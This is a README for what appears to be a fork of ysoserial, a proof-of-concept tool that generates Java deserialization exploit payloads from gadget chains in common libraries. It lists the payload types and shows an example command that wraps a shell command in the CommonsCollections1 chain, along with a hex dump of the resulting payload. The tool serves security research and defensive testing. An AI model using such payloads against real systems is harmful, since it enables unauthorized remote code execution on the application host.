
# ysoserial 

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![](https://github.com/frohoff/ysoserial/blob/master/ysoserial.png)

## Description

Released as part of AppSecCali 2015 Talk ["Marshalling Pickles: how deserializing objects will ruin your day"](http://frohoff.github.io/appseccali-marshalling-pickles/) with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x). 
Later updated to include additional gadget chains for [JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and [Apache Commons Beanutils](https://gist.github.com/frohoff/9eb8811761ff989b3ac0).

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java 
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of objects. 
The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers 
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$ java -jar target/ysoserial-0.0.4-all.jar 
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[programe]' '[option]' '[command to execute]'
	Available payload types:
		CommonsBeanutilsCollectionsLogging1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
		CommonsCollections1 [commons-collections:commons-collections:3.1]
		CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections3 [commons-collections:commons-collections:3.1]
		CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
		Groovy1 [org.codehaus.groovy:groovy:2.3.9]
		Jdk7u21 []
		Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
```

## Examples

```shell
$ java -jar target/ysoserial-0.0.4-all.jar CommonsCollections1 'bin/sh' '-c' 'echo "hatoan security" > /tmp/xxx.x' | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
0000030: 696f 6e48 616e 646c 6572 55ca f50f 15cb  ionHandlerU.....
0000040: 7ea5 0200 024c 000c 6d65 6d62 6572 5661  ~....L..memberVa
0000050: 6c75 6573 7400 0f4c 6a61 7661 2f75 7469  luest..Ljava/uti
0000060: 6c2f 4d61 703b 4c00 0474 7970 6574 0011  l/Map;L..typet..
...
0000460: 7100 7e00 1675 7100 7e00 1b00 0000 0175  q.~..uq.~......u
0000470: 7200 135b 4c6a 6176 612e 6c61 6e67 2e53  r..[Ljava.lang.S
0000480: 7472 696e 673b add2 56e7 e91d 7b47 0200  tring;..V...{G..
0000490: 0078 7000 0000 0374 0006 6269 6e2f 7368  .xp....t..bin/sh
00004a0: 7400 022d 6374 0023 6563 686f 2022 6861  t..-ct.#echo "ha
00004b0: 746f 616e 2073 6563 7572 6974 7922 203e  toan security" >
00004c0: 202f 746d 702f 7878 782e 7874 0004 6578   /tmp/xxx.xt..ex
...
0000570: 3f40 0000 0000 000c 7708 0000 0010 0000  ?@......w.......
0000580: 0000 7878 7672 0012 6a61 7661 2e6c 616e  ..xxvr..java.lan
0000590: 672e 4f76 6572 7269 6465 0000 0000 0000  g.Override......
00005a0: 0000 0000 0078 7071 007e 003e            .....xpq.~.>
```

## Installation

1. Download the latest jar from the "releases" section.

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request
